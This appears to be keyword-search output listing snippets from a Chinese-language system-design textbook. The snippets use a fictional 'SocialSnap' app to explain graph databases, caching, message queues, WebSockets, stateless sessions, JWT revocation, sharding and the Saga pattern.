  c06_b01.md: ...回答“Alice 是不是 Bob 的朋友？”。友谊图有 50 billion（500 亿）条边。在关系型数据库中，回答“Alice 是不是 Bob 的朋友？”是单次索引查找。但“Alice 的所有朋友的朋友都有谁？”——典型的社交图遍历——需要把友谊...
  c06_b01.md: ...0 billion（500 亿）条边。在关系型数据库中，回答“Alice 是不是 Bob 的朋友？”是单次索引查找。但“Alice 的所有朋友的朋友都有谁？”——典型的社交图遍历——需要把友谊表与自身 join，再 join 一次。500 亿行的情况...
  c06_b02.md: ...询，不适合不符合的查询。  **代价（冗余）：** 因为你经常把相关数据嵌入文档而不是规范化，所以会产生数据冗余。如果 Alice 的用户名出现在每篇帖子的文档中（作为作者嵌入），改 Alice 的用户名就需要更新每篇帖子。这就是文档存储版的规范化...
  c06_b02.md: ...相关数据嵌入文档而不是规范化，所以会产生数据冗余。如果 Alice 的用户名出现在每篇帖子的文档中（作为作者嵌入），改 Alice 的用户名就需要更新每篇帖子。这就是文档存储版的规范化 tradeoff（权衡）。   #### 侦探测试  选择文档存...
  c06_b05.md: ...据库——关系作为一等公民  回想本章开头的第二个谜题：一个有 50 billion（500 亿）条友谊边、需要高效回答“Alice 的朋友的朋友都有谁？”的社交网络。  在关系型数据库中，友谊是一张表：       CREATE TABLE frie...
  c06_b05.md: ...R, friend_id INTEGER, PRIMARY KEY (user_id, friend_id));   “Alice 的朋友”是：`SELECT friend_id FROM friendships WHERE user_id = al...
  c06_b05.md: ...LECT friend_id FROM friendships WHERE user_id = alice_id`  “Alice 的朋友的朋友”需要自 join：       SELECT DISTINCT f2.friend_id     FRO...
  c06_b05.md: ...——基本不可用。  图数据库把数据原生存为节点（node，实体）和边（edge，关系）。每条边直接指向它连接的节点。从 Alice 到她的朋友就是跟随指针——而不是表扫描或 join。       Node: Alice (id: 1)...
  c06_b05.md: ...条边直接指向它连接的节点。从 Alice 到她的朋友就是跟随指针——而不是表扫描或 join。       Node: Alice (id: 1)       → FRIENDS_WITH → Node: Bob (id: 2)       → FR...
  c06_b05.md: ...IENDS_WITH → Node: Eve (id: 5)       → FRIENDS_WITH → Node: Alice (id: 1)   找 Alice 的朋友：跟随 Alice 节点的所有 `FRIENDS_WITH` 边。O(Ali...
  c06_b05.md: ...Eve (id: 5)       → FRIENDS_WITH → Node: Alice (id: 1)   找 Alice 的朋友：跟随 Alice 节点的所有 `FRIENDS_WITH` 边。O(Alice 的度数)——与图总大小无关。...
  c06_b05.md: ...→ FRIENDS_WITH → Node: Alice (id: 1)   找 Alice 的朋友：跟随 Alice 节点的所有 `FRIENDS_WITH` 边。O(Alice 的度数)——与图总大小无关。  找朋友的朋友：从每个朋友...
  c06_b05.md: ...据库——关系作为一等公民  回想本章开头的第二个谜题：一个有 50 billion（500 亿）条友谊边、需要高效回答“Alice 的朋友的朋友都有谁？”的社交网络。  在关系型数据库中，友谊是一张表：       CREATE TABLE frie...
  c06_b05.md: ...R, friend_id INTEGER, PRIMARY KEY (user_id, friend_id));   “Alice 的朋友”是：`SELECT friend_id FROM friendships WHERE user_id = al...
  c06_b05.md: ...LECT friend_id FROM friendships WHERE user_id = alice_id`  “Alice 的朋友的朋友”需要自 join：       SELECT DISTINCT f2.friend_id     FRO...
  c06_b05.md: ...——基本不可用。  图数据库把数据原生存为节点（node，实体）和边（edge，关系）。每条边直接指向它连接的节点。从 Alice 到她的朋友就是跟随指针——而不是表扫描或 join。       Node: Alice (id: 1)...
  c06_b05.md: ...条边直接指向它连接的节点。从 Alice 到她的朋友就是跟随指针——而不是表扫描或 join。       Node: Alice (id: 1)       → FRIENDS_WITH → Node: Bob (id: 2)       → FR...
  c06_b05.md: ...IENDS_WITH → Node: Eve (id: 5)       → FRIENDS_WITH → Node: Alice (id: 1)   找 Alice 的朋友：跟随 Alice 节点的所有 `FRIENDS_WITH` 边。O(Ali...
  c06_b05.md: ...Eve (id: 5)       → FRIENDS_WITH → Node: Alice (id: 1)   找 Alice 的朋友：跟随 Alice 节点的所有 `FRIENDS_WITH` 边。O(Alice 的度数)——与图总大小无关。...
  c06_b05.md: ...→ FRIENDS_WITH → Node: Alice (id: 1)   找 Alice 的朋友：跟随 Alice 节点的所有 `FRIENDS_WITH` 边。O(Alice 的度数)——与图总大小无关。  找朋友的朋友：从每个朋友...
  c07_b04.md: ...ue — OR — update it in the cache   让我们用 SocialSnap 走一遍。用户请求 Alice 的资料时：  **第一次请求（冷缓存）：**  1. 应用检查缓存 key `user:1:profile` —— 未...
  c07_b04.md: ...d = 1` 3. 应用把结果存入缓存，key `user:1:profile`，TTL = 5 分钟 4. 应用返回 Alice 的资料  **第二次到第 N 次请求（热缓存）：**  1. 应用检查缓存 key `user:1:profile`...
  c07_b04.md: ...用检查缓存 key `user:1:profile` —— 命中 2. 应用立即返回缓存的资料——无需数据库查询  **Alice 更新简介：**  1. 应用把新简介写入数据库 2. 应用从缓存中删除（使失效）`user:1:profile` 3....
  c07_b04.md: ...*  1. 应用把新简介写入数据库 2. 应用从缓存中删除（使失效）`user:1:profile` 3. 下一次请求 Alice 的资料触发未命中，从数据库取回新鲜数据   #### 为什么使失效而不是更新？  Alice 更新简介时，为什么删除缓...
  c07_b04.md: ...le` 3. 下一次请求 Alice 的资料触发未命中，从数据库取回新鲜数据   #### 为什么使失效而不是更新？  Alice 更新简介时，为什么删除缓存条目而不是用新值更新它？  因为失效更简单也更安全。如果你更新缓存，必须保证缓存写入和数据库...
  c07_b16.md: ...alSnap 工程师 Phil 提出一种“完美缓存失效”策略：“我们完全不用 TTL，每次写入都触发缓存失效事件。用户 Alice 更新任何字段，我们就使她资料缓存失效。新帖子创建，就使所有粉丝的 Feed 缓存失效。” 分析这个提案。它对在哪里？它...
  c07_b16.md: ...用户无法使用 CDN 缓存版本？  **讨论：** 公开用户资料——你访问 `socialsnap.com/users/alice` 且未登录时看到的页面——对每个人都一样。资料照片、简介、粉丝数（或近似数）和公开帖子无论谁请求都相同。  要通过 C...
  c07_b16.md: ...同。  要通过 CDN 提供，SocialSnap 需确保资料页不包含个性化元素。CDN 缓存 `GET /users/alice` 的渲染响应，TTL 5 分钟。任何用户在某个 CDN 节点（比如 Tokyo）的第一次请求从源服务器取页面。接下来的...
  c07_b17.md: ...1. 登录状态不能影响渲染内容（缓存版本不能包含“你已关注 Alice”指示）   2. 没有个性化的“为你推荐”区块   3. 响应体中不能包含 CSRF token 或其他 per-us...
  c07_b17.md: ...token 或其他 per-user 安全令牌  已登录用户不能直接使用 CDN 缓存版本，因为他们期望页面显示他们与 Alice 的关系（关注/取消关注按钮、共同帖子）。常见解决方案：提供 CDN 缓存的“公开外壳”资料页，然后通过不被缓存的第二次...
  c07_b17.md: ...缓存的“公开外壳”资料页，然后通过不被缓存的第二次 Ajax 调用“水合”个性化元素。CDN 承担为通过搜索引擎访问 Alice 的匿名访客提供资料页的重活，而登录用户获得由 CDN 缓存和服务器渲染内容混合构成的略有不同的页面。   ### 本章...
  c08_b06.md: ...#### 事件溯源  传统系统存储实体的**当前状态**。`users` 表存 Alice 当前简介。Alice 更新简介时，旧简介被覆盖。历史丢失。  **事件溯源** 存储**事件历史**而非当前状态。系统...
  c08_b06.md: ...#### 事件溯源  传统系统存储实体的**当前状态**。`users` 表存 Alice 当前简介。Alice 更新简介时，旧简介被覆盖。历史丢失。  **事件溯源** 存储**事件历史**而非当前状态。系统不存“Alice 当前...
  c08_b06.md: ...简介。Alice 更新简介时，旧简介被覆盖。历史丢失。  **事件溯源** 存储**事件历史**而非当前状态。系统不存“Alice 当前简介是 X”，而是存：       Event 1: UserCreated(user_id=1, name="A...
  c08_b06.md: ...e 当前简介是 X”，而是存：       Event 1: UserCreated(user_id=1, name="Alice", bio="Hello!")     Event 2: UserBioUpdated(user_id=1, new_...
  c08_b06.md: ...。  **事件溯源的优势：**  完整审计轨迹：每笔变更都被记录。非常适合金融系统、医疗记录和合规要求。  时间查询：“Alice 3 月 1 日的简介是什么？”变得简单——重放到 3 月 1 日。  调试：“系统为什么是这个状态？”有明确答案——重...
  c08_b12.md: ...#### 应用问题  **Q1.** SocialSnap 想增加“帖子被赞”通知：当 Alice 点赞 Bob 的帖子，Bob 在通知中心收到通知。这是高容量事件（每天数百万赞）。用消息队列为该功能设计消息流。包括：...
  c08_b12.md: ...求。  提示  想想通知服务需要哪些信息来构建 Bob 的通知。然后想故障情况：如果通知被投递两次，Bob 会看到两条“Alice 赞了你的帖子”通知吗？  **答案：**  **事件 schema：**       {       "event_t...
  c08_b12.md: ...数据库中点赞的主键——也对去重有用。  **生产者：** SocialSnap 应用服务器中的“点赞”API 端点。当 Alice 点赞帖子时，服务器：  1. 在 `likes` 表中插入一行（含 `like_id`） 2. 发布 `post.li...
  c08_b12.md: ...`likes` 表中插入一行（含 `like_id`） 2. 发布 `post.liked` 事件到消息队列 3. 向 Alice 的客户端返回 HTTP 200  **消费者：** 通知服务，读取 `post.liked` 事件并：  1. 为 B...
  c09_b07.md: ...户端先请求的情况下主动发送数据。  但 SocialSnap 的通知功能需要服务器实时把通知推送给在线用户。当有人点赞 Alice 的帖子，Alice 应该立即看到通知角标更新——而不是等她下次加载页面。  **WebSocket** 提供全双工通信...
  c09_b07.md: ...动发送数据。  但 SocialSnap 的通知功能需要服务器实时把通知推送给在线用户。当有人点赞 Alice 的帖子，Alice 应该立即看到通知角标更新——而不是等她下次加载页面。  **WebSocket** 提供全双工通信：经过初始 HTTP...
  c09_b07.md: ...et 连接。当通知产生时（由第 8 章的消息队列 like 事件处理器），通知服务直接通过 WebSocket 推送给 Alice 连接的浏览器。亚秒级延迟。没有轮询开销。  WebSocket 的代价：它们是有状态的长连接。服务器必须为每个连接客户...
  c09_b08.md: ...等）。额外字段浪费带宽。  **取回不足（Under-fetching）：** 一个页面可能需要多个资源的数据。要展示 Alice 的资料页（含最近帖子和粉丝数），你可能需要：       GET /users/42           → Alic...
  c09_b08.md: ...lice 的资料页（含最近帖子和粉丝数），你可能需要：       GET /users/42           → Alice's profile     GET /users/42/posts     → Alice's recent post...
  c09_b08.md: ...2           → Alice's profile     GET /users/42/posts     → Alice's recent posts     GET /users/42/followers → Alice's follow...
  c09_b08.md: ...ts     → Alice's recent posts     GET /users/42/followers → Alice's follower count   三个独立 HTTP 请求，每个都有一次网络往返。   #### GraphQL—...
  c09_b13.md: ...数据可用时立即推送。没有轮询、没有重复连接、亚秒级投递。  **WebSocket 是正确选择：** 实时聊天应用。当 Alice 给 Bob 发消息，Bob 的浏览器应立刻显示，无需轮询。服务器一收到消息就通过 Bob 打开的 WebSocket...
  c09_b15.md: ...**Q2.**（联系第 8 章消息队列和第 7 章缓存）SocialSnap 顶部导航中的通知计数角标实时更新。当 Alice 收到新赞时，浏览器应在 1 秒内显示更新后的计数。设计该功能从数据库中“like”事件到 Alice 浏览器出现通知的...
  c09_b15.md: ...角标实时更新。当 Alice 收到新赞时，浏览器应在 1 秒内显示更新后的计数。设计该功能从数据库中“like”事件到 Alice 浏览器出现通知的端到端架构。你的设计应说明：事件流、推送到浏览器的协议，以及与限流系统的交互。  提示  从第 8 章...
  c09_b15.md: ...。  提示  从第 8 章追踪 like 事件。消息队列发布 `post.liked` 事件。某个消费者需要把通知送到 Alice 的浏览器。什么协议支持服务器推送？如果有 100,000 个并发 WebSocket 连接，WebSocket 流量的...
  c09_b16.md: ...**答案：**  **端到端架构：**  **第 1 步：记录 like 事件** Bob 赞了 Alice 的帖子。应用服务器：  * 把 like 插入 PostgreSQL（`likes` 表） * 发布 `post.li...
  c09_b16.md: ...队列消费者）从队列读取 `post.liked` 事件。它：  * 在数据库中创建通知记录 * 在 Redis 中自增 Alice 的未读通知计数：`INCR user:1:notification_count` * 从 Redis 查找 Alice...
  c09_b16.md: ...Alice 的未读通知计数：`INCR user:1:notification_count` * 从 Redis 查找 Alice 的活动 WebSocket 连接：`GET user:1:ws_connections`  **第 3 步：通过 We...
  c09_b16.md: ...接：`GET user:1:ws_connections`  **第 3 步：通过 WebSocket 推送** 如果 Alice 在线（在 Redis 注册了活动 WebSocket 连接）：       { "type": "notificati...
  c09_b16.md: ...{ "type": "notification_count_update", "count": 7 }   该消息通过 Alice 的 WebSocket 连接推送。Alice 的浏览器毫秒级收到并更新角标。  如果 Alice 离线：不推送。等她下...
  c09_b16.md: ..._count_update", "count": 7 }   该消息通过 Alice 的 WebSocket 连接推送。Alice 的浏览器毫秒级收到并更新角标。  如果 Alice 离线：不推送。等她下次加载页面时，获取通知计数的 HTTP 请求从...
  c09_b16.md: ...}   该消息通过 Alice 的 WebSocket 连接推送。Alice 的浏览器毫秒级收到并更新角标。  如果 Alice 离线：不推送。等她下次加载页面时，获取通知计数的 HTTP 请求从 Redis 读取已更新的计数器——已经是最新值。...
  c09_b16.md: ...知计数的 HTTP 请求从 Redis 读取已更新的计数器——已经是最新值。  **WebSocket 连接管理：** Alice 登录时，她的浏览器与通知服务器建立 WebSocket 连接。服务器注册：`SADD user:1:ws_connec...
  c09_b17.md: ...API 网关一起考虑。这三个组件位于用户与应用服务器之间。对请求 `www.socialsnap.com/users/alice`（一个公开资料页），如果 CDN 已缓存该页，追踪哪个组件处理请求、哪些被绕过。这告诉你正在发挥什么设计原则？  **...
  c09_b17.md: ...已缓存该页，追踪哪个组件处理请求、哪些被绕过。这告诉你正在发挥什么设计原则？  **讨论：**  如果 CDN 缓存了 Alice 的资料页：  1. **DNS 解析：** 域名解析为 CDN 边缘节点 IP（DNS 记录指向 CDN，而非直接指向...
  c09_b17.md: ...析仍然发生——浏览器仍需查找 IP 地址。  2. **CDN 边缘节点完全处理请求。** CDN 有 `/users/alice` 的缓存 HTML 响应。它立即返回。没有请求到达 API 网关，没有请求到达应用服务器，也没有数据库查询。  3....
  c09_b17.md: ...中的请求都免除了下游每个组件的工作。  但如第 7 章所述：CDN 缓存只适用于所有用户都相同的内容（公开、非个性化）。Alice 登录后的 home feed——个性化、动态——不能在页面级缓存到 CDN。  **Q2.**（联系第 8 章消息队列...
  c10_b06.md: ...使该用户资料缓存失效（第 7 章）：`DEL user:42:profile`。  照片服务工作流：  1. 用户请求 Alice 的资料页。 2. 应用返回资料页，包含 `<img src="https://storage.socialsnap.c...
  c11_b01.md: ...{         "sess_a7b3c9d2e4f1": {"user_id": 42, "username": "alice", "created_at": ...},         "sess_b8c4d0e5f2a3": {"user_i...
  c11_b01.md: ...7b3c9d2e4f1` 的请求到达时，服务器在本地 `sessions` 字典中查找，找到用户 42，就知道请求来自 Alice。  一台服务器时没问题。三台服务器就坏了。...
  c11_b01.md: ...{         "sess_a7b3c9d2e4f1": {"user_id": 42, "username": "alice", "created_at": ...},         "sess_b8c4d0e5f2a3": {"user_i...
  c11_b01.md: ...7b3c9d2e4f1` 的请求到达时，服务器在本地 `sessions` 字典中查找，找到用户 42，就知道请求来自 Alice。  一台服务器时没问题。三台服务器就坏了。...
  c11_b02.md: ...### 11.2 根本原因——有状态的应用服务器  Alice 登录。轮询负载均衡器把她的登录请求路由到 Server A。Server A 在本地 `sessions` 字典中创建...
  c11_b02.md: ...录请求路由到 Server A。Server A 在本地 `sessions` 字典中创建会话记录并设置 cookie。Alice 的浏览器现在有了会话 cookie。  Alice 点击“我的资料”。负载均衡器把该请求路由到 Server B（轮询...
  c11_b02.md: ...本地 `sessions` 字典中创建会话记录并设置 cookie。Alice 的浏览器现在有了会话 cookie。  Alice 点击“我的资料”。负载均衡器把该请求路由到 Server B（轮询序列中的下一个）。Server B 收到带 cook...
  c11_b02.md: ...理的。会话只存在于 Server A 的内存中。  Server B 认为这是未认证请求，返回错误或重定向到登录页。  Alice 实际上因为点击“我的资料”而被登出。  这就是有状态应用服务器问题。应用服务器维护着**状态**（session 数据...
  c11_b03.md: ...#### 方案 1：粘性会话（错误）  最简单的修复：配置负载均衡器，让同一用户总是路由到同一台服务器。Alice 的会话在 Server A 创建后，她后续所有请求都路由到 Server A。问题解决了吗？  并不完全。  **IP...
  c11_b03.md: ...为同一个 IP 地址——他们全都会被路由到同一台后端服务器。  **服务器故障问题：** 如果 Server A 宕机，Alice 的所有会话都丢失了。她（以及所有会话在 Server A 上的其他用户）必须重新登录。粘性会话把服务器故障变成强制登出...
  c11_b03.md: ...器间共享会话（脆弱）  另一种方案：使用分布式共享文件系统或数据库，三台服务器都把会话数据写进去。Server A 把 Alice 的会话写到共享存储；Server B 和 C 可以读取。  原则上可行。实践中，这正是在重新发明分布式会话存储——而方...
  c11_b04.md: ...ion expired or invalid         return json.loads(data)   现在 Alice 在 Server A 登录时，会话存在 Redis 中——Server B 和 C 都能访问。Alice 的下一个请求...
  c11_b04.md: ...)   现在 Alice 在 Server A 登录时，会话存在 Redis 中——Server B 和 C 都能访问。Alice 的下一个请求到 Server B 时，Server B 在 Redis 中找到会话。Alice 保持登录。应用服务器现...
  c11_b04.md: ...B 和 C 都能访问。Alice 的下一个请求到 Server B 时，Server B 在 Redis 中找到会话。Alice 保持登录。应用服务器现在是无状态的——它自己内存里不保存任何每个会话的数据。  **额外收益：**  **会话 TTL...
  c11_b06.md: ...服务器在登录时签发 JWT：  1. 创建 payload：`{"user_id": 42, "username": "alice", "exp": 1709510400}` 2. 用 secret key 签名：`HMACSHA256(base64...
  c11_b06.md: ...成本与撤销问题  JWT 听起来是完美方案。为什么还要用 Redis 会话？  **撤销问题是致命局限。**  考虑：Alice 的账户被入侵。SocialSnap 安全团队强制登出 Alice 的账户。用 Redis 会话，这很简单：`DEL s...
  c11_b06.md: ...is 会话？  **撤销问题是致命局限。**  考虑：Alice 的账户被入侵。SocialSnap 安全团队强制登出 Alice 的账户。用 Redis 会话，这很简单：`DEL session:alice_session_id` 或 `DEL u...
  c11_b06.md: ...很简单：`DEL session:alice_session_id` 或 `DEL user:42:sessions`。Alice 的下一个请求找不到会话，被重定向到登录。  用 JWT，Alice 有一个 `"exp": 1709510400` 的...
  c11_b06.md: ...或 `DEL user:42:sessions`。Alice 的下一个请求找不到会话，被重定向到登录。  用 JWT，Alice 有一个 `"exp": 1709510400` 的 JWT（24 小时后过期）。24 小时内服务器没有任何办法让 JW...
  c11_b06.md: ...JWT 失效，因为服务器没有已签发 token 的中心记录。“登出”只是删除客户端 cookie，但如果攻击者窃取了 Alice 的 JWT，他们会一直用到过期。  存在 workaround：  * 短 JWT 过期时间（15 分钟）——需要 r...
  c11_b11.md: ...，因为这会把服务器故障变成强制会话终止，并阻止真正的负载均衡。  如果应用服务器有状态，跨服务器分发请求就会产生不匹配：Alice 的会话状态在 Server A，但她的请求可能到 Server B，而 Server B 没有她的状态。系统要么 (a...
  c11_b11.md: ...状态在 Server A，但她的请求可能到 Server B，而 Server B 没有她的状态。系统要么 (a) 把 Alice 的所有请求都路由到 Server A——消除负载均衡的收益；要么 (b) 接受错误行为（Alice 随机被登出）——显...
  c11_b11.md: ...他们不得不反复重新登录。  **根本原因：** 会话数据存在每台应用服务器的内存字典（本地 Python dict）中。Alice 登录时，请求到 Server A，它在 Server A 的本地内存中创建了她的会话。但 Alice 的后续请求被轮询...
  c11_b11.md: ...n dict）中。Alice 登录时，请求到 Server A，它在 Server A 的本地内存中创建了她的会话。但 Alice 的后续请求被轮询负载均衡器分到 Server B 或 C，它们检查自己的本地会话字典——其中没有 Alice 的会话。...
  c11_b11.md: ...会话。但 Alice 的后续请求被轮询负载均衡器分到 Server B 或 C，它们检查自己的本地会话字典——其中没有 Alice 的会话。Server B 没找到 Alice cookie 对应的会话，把她当作未认证。  **修复：** 把会话存储...
  c11_b11.md: ...器分到 Server B 或 C，它们检查自己的本地会话字典——其中没有 Alice 的会话。Server B 没找到 Alice cookie 对应的会话，把她当作未认证。  **修复：** 把会话存储从应用服务器本地内存移到共享外部 Redis...
  c11_b11.md: ...复：** 把会话存储从应用服务器本地内存移到共享外部 Redis 实例。三台应用服务器都从同一个 Redis 读写会话。Alice 在 Server A 登录时，会话存在 Redis 中。她的下一个请求到 Server B 时，Server B 查询...
  c11_b11.md: ...，会话存在 Redis 中。她的下一个请求到 Server B 时，Server B 查询 Redis，找到会话，认证 Alice。应用服务器现在无状态——不保存任何每个会话的数据。  **Q3.** 什么是 JWT？相比服务端会话它解决什么问题，什...
  c11_b12.md: ...密签名检查），零网络延迟、零外部依赖。  **根本局限——撤销：** JWT 在过期前一直有效，无论服务器做什么。如果 Alice 的账户被停用或入侵，删除服务端会话会在下一次请求立即生效。但有效 JWT 无法在不采取以下措施之一前失效：  * 等待...
  c11_b13.md: ...生什么。想想很多用户共享同一个 IP 地址时（比如公司 NAT 后）。  **答案：** 粘性会话确实解决了眼前问题——Alice 的请求到持有她会话的同一台服务器，所以她保持登录。但该方案表面，并引入严重问题：  **故障模式 1：服务器故障导致强...
  c11_b14.md: ...提示  想想“local_cache”在三台服务器中意味着什么。如果 Alice 在 Server A 更新资料，失效需要到达哪些缓存？  **答案：** 问题：`local_cache` 是每个应用...
  c11_b14.md: ...这违反无状态要求——每台服务器持有未与同伴共享的状态（缓存的资料数据）。  **bug 类别：缓存失效不一致。** 当 Alice 更新资料时：  1. 更新请求由 Server A 处理。 2. Server A 把新资料写入 PostgreSQL...
  c11_b14.md: ...Server C 仍缓存着旧资料。  在接下来的 5 分钟（缓存 TTL）内，任何路由到 Server B 或 C 的 Alice 资料请求都返回旧资料。Alice 在当前浏览器会话（由 Server A 服务）中看到更新，但她的朋友可能看到旧资料。...
  c11_b14.md: ...在接下来的 5 分钟（缓存 TTL）内，任何路由到 Server B 或 C 的 Alice 资料请求都返回旧资料。Alice 在当前浏览器会话（由 Server A 服务）中看到更新，但她的朋友可能看到旧资料。  **修复：** 把 `loca...
  c12_b02.md: ...旧。这个差距称为**复制延迟（replication lag）**，它造成微妙但危险的处境。  想象这个序列：  1. Alice 发布一条状态更新。写进入主库。帖子已存。 2. Alice 的浏览器立即请求自己的资料页查看新帖子。应用服务器把该读路...
  c12_b02.md: ...）**，它造成微妙但危险的处境。  想象这个序列：  1. Alice 发布一条状态更新。写进入主库。帖子已存。 2. Alice 的浏览器立即请求自己的资料页查看新帖子。应用服务器把该读路由到副本。 3. 副本还没应用 Alice 的写入——复制延...
  c12_b02.md: ...帖子已存。 2. Alice 的浏览器立即请求自己的资料页查看新帖子。应用服务器把该读路由到副本。 3. 副本还没应用 Alice 的写入——复制延迟 500 毫秒。 4. Alice 的资料页加载出来，没有她的新帖子。 5. Alice 以为帖子丢...
  c12_b02.md: ...料页查看新帖子。应用服务器把该读路由到副本。 3. 副本还没应用 Alice 的写入——复制延迟 500 毫秒。 4. Alice 的资料页加载出来，没有她的新帖子。 5. Alice 以为帖子丢了，又发一遍。 6. 现在她有了重复帖子。  这与第...
  c12_b02.md: ...本还没应用 Alice 的写入——复制延迟 500 毫秒。 4. Alice 的资料页加载出来，没有她的新帖子。 5. Alice 以为帖子丢了，又发一遍。 6. 现在她有了重复帖子。  这与第 7 章 Redis 缓存中看到的陈旧性问题一样，但 s...
  c12_b07.md: ...按 `user_id` 分片，因此同一用户的数据落在同一 shard——这个特定问题被避免了。  但考虑转账操作：用户 Alice（Shard 1）给用户 Bob（Shard 3）送礼。扣减 Alice 余额，增加 Bob 余额。这些更新必须原子——...
  c12_b07.md: ...这个特定问题被避免了。  但考虑转账操作：用户 Alice（Shard 1）给用户 Bob（Shard 3）送礼。扣减 Alice 余额，增加 Bob 余额。这些更新必须原子——不能扣了 Alice 却没加到 Bob，让钱消失在虚空中。Alice 在...
  c12_b07.md: ...d 1）给用户 Bob（Shard 3）送礼。扣减 Alice 余额，增加 Bob 余额。这些更新必须原子——不能扣了 Alice 却没加到 Bob，让钱消失在虚空中。Alice 在 Shard 1、Bob 在 Shard 3，这就是**分布式事务（...
  c12_b07.md: ...减 Alice 余额，增加 Bob 余额。这些更新必须原子——不能扣了 Alice 却没加到 Bob，让钱消失在虚空中。Alice 在 Shard 1、Bob 在 Shard 3，这就是**分布式事务（distributed transaction）...
  c12_b08.md: ...wSQL 可能杀鸡用牛刀。  更深教训：**设计分片策略时，把必须事务一致的数据共置（co-locate）。** 如果 Alice 的余额和交易历史始终在同一 shard（因为都按 `user_id` 分片），大多数操作就不需分布式事务。那些确实需要...
  c14_b10.md: ...同一个值。正在写时，不同读者可能因访问的副本及该副本落后程度不同而看到不同值。  强一致性必要场景：用户银行余额。如果 Alice 给 Bob 转 100 USD，Alice 账户扣减和 Bob 账户贷记必须强一致。如果任一节点的后续读仍能返回转账前...
  c14_b10.md: ...及该副本落后程度不同而看到不同值。  强一致性必要场景：用户银行余额。如果 Alice 给 Bob 转 100 USD，Alice 账户扣减和 Bob 账户贷记必须强一致。如果任一节点的后续读仍能返回转账前 Alice 的余额，她可能再次转出同样 1...
  c14_b10.md: ...给 Bob 转 100 USD，Alice 账户扣减和 Bob 账户贷记必须强一致。如果任一节点的后续读仍能返回转账前 Alice 的余额，她可能再次转出同样 100 USD，导致双重支付。  最终一致性可接受场景：SocialSnap 帖子的显示点...
  c15_b03.md: ...。按按钮是幂等的——多按不会召唤更多电梯。  有些操作天然幂等：  * `SET user 42's name to "Alice"`——做两次结果仍是 "Alice"。幂等。 * `GET user 42's profile`——读没有副作用。幂等...
  c15_b03.md: ...电梯。  有些操作天然幂等：  * `SET user 42's name to "Alice"`——做两次结果仍是 "Alice"。幂等。 * `GET user 42's profile`——读没有副作用。幂等。 * `DELETE post 9...
  c21_b10.md: ...据库成为瓶颈。加入读副本处理 feed 日益增长的读负载。最终按 `user_id` 分片。首个跨分片查询问题：“查找 Alice 关注的所有用户的帖子”需要查所有分片。引入反规范化预连接频繁共现数据。  **v6（第 16 章）：** 首次重大故障...

=== saga (130 occurrences) ===
  c12_b10.md: ...off：在扣款成功和贷记成功之间的窗口，钱“在途”——已离开 A 但尚未到 B。这个中间状态必须正确处理，系统短暂可见。Saga 模式（第 15 章）正式化了这种方法。  **思路 2：中间托管账户。** 不直接转账，而是先把 A 扣到一个锁定的“...
  c14_b15.md: ...p 的传奇：“向用户收费并发送确认邮件”的操作必须是原子的，但它跨越支付服务和通知服务——两个无法共享事务的独立数据库。Saga 模式就是答案。它是异步分布式系统对第 14 章分布式一致性问题的回答：不是让所有操作一起原子，而是把它们按顺序编排，用...
  c15_b01.md: ...nap 的问题——几乎每个微服务架构中有意义的业务操作都涉及多个必须在无共享事务的情况下协调的服务。  解决方案是 **Saga 模式（Saga pattern）**，在讲到它之前，我们需要先理解它依赖的构件：任务队列、至少一次投递和幂等性。...
  c15_b04.md: ...最佳实践：用用户 ID、操作类型和随机 UUID 或含足够熵的时间戳组合生成幂等键，以消除冲突。   ### 15.4 Saga 模式——不用 2PC 的分布式事务  现在我们有了处理 SocialSnap 高级版升级问题的工具。Saga 模式是一...
  c15_b04.md: ...15.4 Saga 模式——不用 2PC 的分布式事务  现在我们有了处理 SocialSnap 高级版升级问题的工具。Saga 模式是一种在多个服务间实现分布式事务而不使用两阶段提交的设计模式。...
  c15_b05.md: ...#### 定义：Saga  **Saga** 是一系列本地事务序列，每个服务一个，合起来实现一个分布式业务操作。每个本地事务更新服务自己的数据库...
  c15_b05.md: ...#### 定义：Saga  **Saga** 是一系列本地事务序列，每个服务一个，合起来实现一个分布式业务操作。每个本地事务更新服务自己的数据库，并发布消息或事...
  c15_b05.md: ...每个服务一个，合起来实现一个分布式业务操作。每个本地事务更新服务自己的数据库，并发布消息或事件触发下一步。如果某步失败，saga 执行**补偿事务**——撤销之前已完成步骤效果反向操作。  plain 语言：不是一个大原子事务整体提交或回滚，sag...
  c15_b05.md: ...aga 执行**补偿事务**——撤销之前已完成步骤效果反向操作。  plain 语言：不是一个大原子事务整体提交或回滚，saga 是一串较小事务。如果链中途失败，你不回滚——而是为已完成步骤运行“撤销”操作。  关键洞见：**补偿事务取代回滚**。...
  c15_b05.md: ...事务：发起退款。  退款并不真正撤销扣款（银行记录仍会显示扣款和退款），但它抵消了业务效果。   #### 高级版升级 Saga  SocialSnap 高级版升级 saga 显式写出如下：  步骤 | 服务 | 正向操作 | 补偿事务 |---|...
  c15_b05.md: ...记录仍会显示扣款和退款），但它抵消了业务效果。   #### 高级版升级 Saga  SocialSnap 高级版升级 saga 显式写出如下：  步骤 | 服务 | 正向操作 | 补偿事务 |---|---|---|--- 1 | Payment...
  c15_b05.md: ...` 3 | Notification Service | 发送确认邮件 | （无法补偿——邮件不能撤回。记录问题。）  Saga 执行：第 1 步成功，第 2 步成功，第 3 步失败（邮件服务宕机）。因为第 3 步是最后一步且失败，saga 的补偿...
  c15_b05.md: ...。）  Saga 执行：第 1 步成功，第 2 步成功，第 3 步失败（邮件服务宕机）。因为第 3 步是最后一步且失败，saga 的补偿计划运行：撤销第 2 步（设置 `is_premium = false`），然后撤销第 1 步（发起退款）。用户...
  c15_b05.md: ...级版，也没被扣款。失败被记录。他们可以稍后重试。  但如果第 2 步失败（升级期间 User Service 宕机）呢？saga 补偿：撤销第 1 步（退款）。第 3 步没跑，所以无需撤销。  关于第 3 步的重点：发邮件不可补偿。你不能“取消发送...
  c15_b05.md: ...步（退款）。第 3 步没跑，所以无需撤销。  关于第 3 步的重点：发邮件不可补偿。你不能“取消发送”一封邮件。这是 saga 模式的**真正局限**。标准做法是把不可补偿步骤尽量**放在 saga 最后**。如果“发邮件”是第 3 步（最后），...
  c15_b05.md: ...邮件不可补偿。你不能“取消发送”一封邮件。这是 saga 模式的**真正局限**。标准做法是把不可补偿步骤尽量**放在 saga 最后**。如果“发邮件”是第 3 步（最后），只有第 1、2 步都成功才会发邮件。如果“发邮件”是第 1 步，那么扣款...
  c15_b05.md: ...都成功才会发邮件。如果“发邮件”是第 1 步，那么扣款或账户更新失败前已经发了邮件——而这些失败无法把邮件收回。  **Saga 设计原则：按可补偿性从强到弱排序步骤，把不可补偿副作用放在最后。**   ### 15.5 编排与编舞  协调 sag...
